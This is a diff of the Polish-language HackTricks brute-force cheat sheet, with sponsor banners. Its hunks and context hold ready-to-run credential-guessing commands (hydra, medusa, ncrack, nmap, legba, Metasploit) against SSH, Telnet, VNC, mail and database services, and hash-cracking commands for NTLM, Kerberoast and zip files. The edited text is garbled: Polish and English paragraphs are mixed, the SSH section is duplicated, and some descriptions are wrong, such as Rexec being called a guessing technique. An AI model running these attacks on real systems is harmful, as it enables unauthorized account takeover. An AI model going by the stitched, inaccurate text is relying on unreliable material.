@@ -1,4 +1,4 @@
-# Atak siłowy - Arkusz informacyjny
+# Brute Force - Karta oszustwa
 
 <figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
 
@@ -14,11 +14,11 @@ Zdobądź dostęp już dziś:
 
 Inne sposoby wsparcia HackTricks:
 
-* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
+* Jeśli chcesz zobaczyć swoją **firmę reklamowaną na HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
 * Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
 * **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na GitHubie.
 
 </details>
 
@@ -60,13 +60,13 @@ cewl example.com -m 5 -w words.txt
 ```
 ### [CUPP](https://github.com/Mebus/cupp)
 
-Generowanie haseł na podstawie wiedzy o ofierze (imię, daty...)
+Generuj hasła na podstawie swojej wiedzy o ofierze (imię, daty...)
 ```
 python3 cupp.py -h
 ```
 ### [Wister](https://github.com/cycurity/wister)
 
- Narzędzie do generowania list słów, które pozwala dostarczyć zestaw słów, dając możliwość tworzenia wielu wariacji na podstawie podanych słów, tworząc unikalną i idealną listę słów do użycia w odniesieniu do określonego celu.
+Narzędzie do generowania list słów, które pozwala dostarczyć zestaw słów, dając możliwość tworzenia wielu wariacji na podstawie podanych słów, tworząc unikalną i idealną listę słów do użycia w odniesieniu do określonego celu.
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
 
@@ -138,7 +138,15 @@ legba scylla --username cassandra --password wordlists/passwords.txt --target lo
 ```
 ### CouchDB
 
-CouchDB to popularna baza danych NoSQL, która może być atakowana za pomocą ataków typu brute force. Atakujący mogą próbować odgadnąć hasła użytkowników, korzystając z różnych kombinacji znaków. Aby zabezpieczyć CouchDB przed atakami brute force, zaleca się korzystanie z silnych haseł, włączenie mechanizmów blokowania konta po wielu nieudanych próbach logowania oraz korzystanie z dodatkowych warstw zabezpieczeń, takich jak VPN czy firewall.
+CouchDB is a NoSQL database that can be targeted using brute force attacks. 
+
+#### Brute Forcing CouchDB
+
+To brute force CouchDB, you can use tools like Hydra or write custom scripts to automate the process. 
+
+#### Protecting CouchDB
+
+To protect CouchDB from brute force attacks, ensure strong passwords are used and implement account lockout policies to prevent multiple login attempts.
 ```bash
 msf> use auxiliary/scanner/couchdb/couchdb_login
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
@@ -181,14 +189,14 @@ hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordl
 ```
 Dla http**s** musisz zmienić z "http-post-form" na "**https-post-form"**
 
-### **HTTP - CMS --** (W)ordpress, (J)oomla or (D)rupal or (M)oodle
+### **HTTP - CMS --** (W)ordpress, (J)oomla lub (D)rupal lub (M)oodle
 ```bash
 cmsmap -f W/J/D/M -u a -p a https://wordpress.com
 # Check also https://github.com/evilsocket/legba/wiki/HTTP
 ```
 ### IMAP
 
-IMAP (Internet Message Access Protocol) is a standard email protocol that stores email messages on a mail server. When a hacker is attempting to brute force IMAP credentials, they typically use a list of common usernames and passwords. This can be done using tools like Hydra or Medusa.
+IMAP (Internet Message Access Protocol) is a standard email protocol that stores email messages on a mail server. When a hacker is attempting to brute force IMAP credentials, they typically use a list of common usernames and passwords. This can be done manually or by using automated tools like Hydra or Medusa. It's important to note that brute forcing is illegal and unethical unless you have explicit permission to test the security of a system.
 ```bash
 hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
 hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
@@ -196,6 +204,8 @@ nmap -sV --script imap-brute -p <PORT> <IP>
 legba imap --username user --password data/passwords.txt --target localhost:993
 ```
 ### IRC
+
+Internet Relay Chat (IRC) to protokół komunikacyjny używany do czatu w czasie rzeczywistym przez użytkowników z całego świata. Można go wykorzystać do przeprowadzania ataków typu brute force na serwery IRC, próbując odgadnąć hasła użytkowników.
 ```bash
 nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
 ```
@@ -295,6 +305,8 @@ pip3 install cx_Oracle --upgrade
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
 ```
 ### POP
+
+POP (Post Office Protocol) jest jednym z najstarszych protokołów pocztowych używanych do pobierania wiadomości e-mail z serwera poczty. Atak typu brute force na serwer POP może obejmować wielokrotne próby logowania się do konta e-mail za pomocą różnych kombinacji nazwy użytkownika i hasła. To może prowadzić do kompromitacji konta e-mail i dostępu do poufnych informacji.
 ```bash
 hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
 hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V
@@ -306,8 +318,6 @@ legba pop3 --username admin@example.com --password wordlists/passwords.txt --tar
 legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
 ```
 ### PostgreSQL
-
-PostgreSQL to otwarty system zarządzania relacyjnymi bazami danych (ORDBMS). Jego popularność wynika z zaawansowanych funkcji, zgodności z ANSI SQL oraz możliwości obsługi dużych obciążeń.
 ```bash
 hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
 medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
@@ -338,6 +348,8 @@ hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
 legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
 ```
 ### Rexec
+
+Rexec to metoda polegająca na próbie odgadnięcia hasła poprzez wielokrotne próby logowania się do systemu za pomocą różnych kombinacji haseł. Jest to jedna z najbardziej podstawowych technik ataku typu brute force.
 ```bash
 hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
 ```
@@ -349,7 +361,7 @@ hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
 ```
 ### Rsh
 
-Rsh (Remote Shell) is a brute-force attack that targets the RSH service. Attackers attempt to guess usernames and passwords to gain unauthorized access to a remote system. This attack can be mitigated by using strong, unique passwords and implementing account lockout policies.
+Remote Shell (Rsh) to protokół zdalnego dostępu, który umożliwia użytkownikowi zdalne uruchamianie poleceń na zdalnym systemie. Atakujący może użyć techniki brute force, aby próbować zgadnąć hasło użytkownika i uzyskać nieautoryzowany dostęp do systemu. Aby zabezpieczyć się przed atakami brute force, zaleca się korzystanie z silnych haseł, mechanizmów blokowania konta po wielokrotnych nieudanych próbach logowania oraz monitorowania logów systemowych w celu wykrycia podejrzanej aktywności.
 ```bash
 hydra -L <Username_list> rsh://<Victim_IP> -v -V
 ```
@@ -412,7 +424,11 @@ msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts
 ```
 ### SSH
 
-SSH (Secure Shell) is a cryptographic network protocol for operating network services securely over an unsecured network. It is widely used for secure remote access and control of systems.
+SSH (Secure Shell) is a cryptographic network protocol for operating network services securely over an unsecured network. It is widely used for secure remote access to systems and executing commands. 
+
+### SSH
+
+SSH (Secure Shell) to kryptograficzny protokół sieciowy umożliwiający bezpieczne korzystanie z usług sieciowych w niezabezpieczonej sieci. Jest powszechnie stosowany do bezpiecznego zdalnego dostępu do systemów i wykonywania poleceń.
 ```bash
 hydra -l root -P passwords.txt [-t 32] <IP> ssh
 ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
@@ -434,7 +450,7 @@ legba stomp --target localhost:61613 --username admin --password data/passwords.
 ```
 ### Telnet
 
-Telnet to protokół komunikacyjny, który umożliwia zdalne logowanie się do urządzenia. Atak brute force na Telnet polega na próbie zgadnięcia hasła, próbując różne kombinacje haseł, aż do uzyskania dostępu. To popularna technika ataku na słabe hasła.
+Telnet to protokół komunikacyjny, który umożliwia zdalne logowanie się do hostów. Atak brute force na Telnet polega na próbie zgadnięcia hasła, próbując różne kombinacje haseł, aż do uzyskania dostępu. To niebezpieczne, ponieważ hasła przesyłane są w postaci tekstu jawnego, co ułatwia przechwycenie przez potencjalnego atakującego. Aby zabezpieczyć się przed atakami brute force na Telnet, zaleca się korzystanie z silnych haseł i/lub implementację mechanizmów blokowania po wielu nieudanych próbach logowania.
 ```bash
 hydra -l root -P passwords.txt [-t 32] <IP> telnet
 ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
@@ -456,7 +472,7 @@ medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
 ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
 patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
 use auxiliary/scanner/vnc/vnc_login
-nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
+nmap -p 5900,5901 --script vnc-brute --script-args brute.credfile=wordlist.txt <IP>
 legba vnc --target localhost:5901 --password data/passwords.txt
 
 #Metasploit
@@ -512,7 +528,7 @@ hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 ```
 #### Atak znany jako tekst jawny zip
 
-Musisz znać **tekst jawny** (lub część tekstu jawnego) **pliku zawartego wewnątrz** zaszyfrowanego pliku zip. Możesz sprawdzić **nazwy plików i rozmiar plików zawartych wewnątrz** zaszyfrowanego pliku zip, uruchamiając: **`7z l encrypted.zip`**\
+Musisz znać **tekst jawnego** (lub część tekstu jawnego) **pliku zawartego wewnątrz** zaszyfrowanego pliku zip. Możesz sprawdzić **nazwy plików i rozmiar plików zawartych wewnątrz** zaszyfrowanego pliku zip, uruchamiając: **`7z l encrypted.zip`**\
 Pobierz [**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) ze strony wydań.
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
@@ -578,6 +594,8 @@ keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a f
 john --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
 ### Keberoasting
+
+Keberoasting to technika polegająca na ataku słabych haseł usług Active Directory poprzez wykorzystanie słabości w protokole Kerberos. Atakujący wykorzystuje narzędzie do zgadywania haseł w celu zdobycia biletów usługi (Service Tickets) zaszyfrowanych za pomocą hasha hasła użytkownika. Następnie atakujący może przeprowadzić atak offline w celu złamania tych haseł.
 ```bash
 john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
@@ -620,16 +638,16 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 
 <figure><img src="../.gitbook/assets/image (660).png" alt=""><figcaption></figcaption></figure>
 
-### Klucz główny DPAPI
+### DPAPI Master Key
 
 Użyj [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py), a następnie john
 
-### Kolumna zabezpieczona hasłem w Open Office
+### Open Office Pwd Protected Column
 
-Jeśli masz plik xlsx z kolumną zabezpieczoną hasłem, możesz ją odblokować:
+Jeśli masz plik xlsx z kolumną chronioną hasłem, możesz ją odblokować:
 
-* **Prześlij go do dysku Google** i hasło zostanie automatycznie usunięte
-* Aby **ręcznie je usunąć**:
+* **Prześlij go do Google Drive**, a hasło zostanie automatycznie usunięte
+* Aby **usunąć** je **ręcznie**:
 ```bash
 unzip file.xlsx
 grep -R "sheetProtection" ./*
@@ -648,7 +666,7 @@ crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
 <figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
 
 \
-Użyj [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks), aby łatwo budować i **automatyzować** przepływy pracy z wykorzystaniem najbardziej zaawansowanych narzędzi społecznościowych na świecie.\
+Użyj [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks), aby łatwo budować i **automatyzować** przepływy pracy zasilane przez najbardziej zaawansowane narzędzia społecznościowe na świecie.\
 Otrzymaj dostęp już dziś:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -692,7 +710,7 @@ john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 ```
 hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 ```
-* **Atak łączenia listy słów**
+* **Atak łączenia list słów**
 
 Możliwe jest **połączenie 2 list słów w 1** za pomocą hashcat-a.\
 Jeśli lista 1 zawierała słowo **"hello"**, a druga zawierała 2 linie z słowami **"world"** i **"earth"**. Wygenerowane zostaną słowa `helloworld` i `helloearth`.
@@ -750,15 +768,7 @@ hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
 ```bash
 hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
-# Brute Forcing
-
-## Brute Forcing Passwords
-
-Brute forcing is a common technique used to crack passwords. It involves trying all possible combinations of passwords until the correct one is found. This can be done using tools like John the Ripper or Hashcat.
-
-### Cracking Linux Hashes
-
-One common target for brute forcing is the `/etc/shadow` file in Linux systems. This file stores password hashes, which can be cracked using brute force techniques. By extracting the hashes from the file, an attacker can use tools to try different password combinations until the correct one is found.
+# Kradzież Haszy Linuxa - plik /etc/shadow
 ```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
 3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
@@ -767,38 +777,56 @@ One common target for brute forcing is the `/etc/shadow` file in Linux systems. 
 ```
 # Brute Force
 
-## Introduction
-
-Brute force attacks are a common way to crack passwords. This method involves trying all possible combinations of characters until the correct password is found. In the context of cracking Windows hashes, brute force attacks can be used to crack the LM and NTLM hashes of Windows passwords.
+Brute force attacks are a common way to crack passwords. They consist of systematically checking all possible passwords until the correct one is found. Brute force attacks can be time-consuming but are often effective.
 
 ## Tools
 
 There are several tools available for performing brute force attacks on Windows hashes. Some popular tools include:
 
-- **John the Ripper**: A powerful password cracking tool that can be used for brute force attacks on Windows hashes.
-- **Hashcat**: Another popular password cracking tool that supports brute force attacks on Windows hashes.
-- **Hydra**: A fast and flexible password cracking tool that can also be used for brute force attacks on Windows hashes.
+- **John the Ripper**: A powerful password-cracking tool that can be used for both dictionary and brute force attacks.
+- **Hashcat**: Another popular password-cracking tool that supports various algorithms and attack modes.
+- **Hydra**: A fast and flexible network login cracker that supports multiple protocols, including Windows authentication.
 
 ## Methodology
 
 To crack Windows hashes using a brute force attack, follow these general steps:
 
-1. Obtain the Windows hashes that you want to crack.
-2. Choose a suitable tool for performing the brute force attack.
-3. Configure the tool with the necessary parameters, such as character set, minimum and maximum password length, etc.
-4. Start the brute force attack and wait for the tool to find the correct password.
-5. Once the password is found, use it to gain unauthorized access to the Windows system.
+1. Obtain the hash: Extract the password hash from the Windows system you want to crack.
+2. Choose a tool: Select a password-cracking tool that supports brute force attacks on Windows hashes.
+3. Configure the tool: Set up the tool with the necessary parameters, such as the hash type and attack mode.
+4. Start the attack: Initiate the brute force attack and let the tool run until it finds the correct password.
+5. Verify the password: Once the tool has found a password, verify it by logging in to the Windows system.
 
-## Conclusion
-
-Brute force attacks can be an effective way to crack Windows hashes and gain unauthorized access to Windows systems. However, they can be time-consuming and resource-intensive, especially for complex passwords. It is important to use strong passwords and other security measures to protect against brute force attacks.
+By following these steps and using the right tools, you can successfully crack Windows hashes using brute force attacks.
 ```
 3000 | LM                                               | Operating-Systems
 1000 | NTLM                                             | Operating-Systems
 ```
-## Brute-Force
+# Brute Force
 
-Brute-force attacks are a common way to crack hashes. This method involves trying all possible combinations of characters until the correct one is found. Brute-forcing can be time-consuming but is effective against weak passwords. Tools like John the Ripper and Hashcat are commonly used for brute-forcing hashes.
+## Introduction
+
+Brute force attacks are a common method used to crack hashes. This technique involves trying all possible combinations of characters until the correct one is found. Brute force attacks can be time-consuming but are often successful in cracking common application hashes.
+
+## Tools
+
+There are several tools available for conducting brute force attacks, such as Hashcat, John the Ripper, and Hydra. These tools can be used to automate the process of trying different combinations of characters to crack hashes.
+
+## Methodology
+
+1. **Select the Hash**: Obtain the hash that you want to crack from the application or system you are targeting.
+
+2. **Choose the Tool**: Select a brute force tool that is suitable for the type of hash you are trying to crack.
+
+3. **Set the Parameters**: Configure the tool with the necessary parameters, such as the hash type and character set to use for the brute force attack.
+
+4. **Start the Attack**: Initiate the brute force attack and let the tool try different combinations of characters until the correct one is found.
+
+5. **Crack the Hash**: Once the correct combination is found, the hash will be cracked, and you will have access to the plaintext password.
+
+## Conclusion
+
+Brute force attacks can be an effective method for cracking common application hashes. By using the right tools and following the proper methodology, you can successfully crack hashes and gain access to sensitive information.
 ```
 900 | MD4                                              | Raw Hash
 0 | MD5                                              | Raw Hash
@@ -818,14 +846,14 @@ Inne sposoby wsparcia HackTricks:
 * Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
 * **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.
 
 </details>
 
 <figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
 
 \
-Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować przepływy pracy** zasilane przez **najbardziej zaawansowane** narzędzia społecznościowe na świecie.\
+Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) do łatwego tworzenia i **automatyzacji prac** z wykorzystaniem najbardziej zaawansowanych narzędzi społeczności.\
 Otrzymaj dostęp już dziś:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
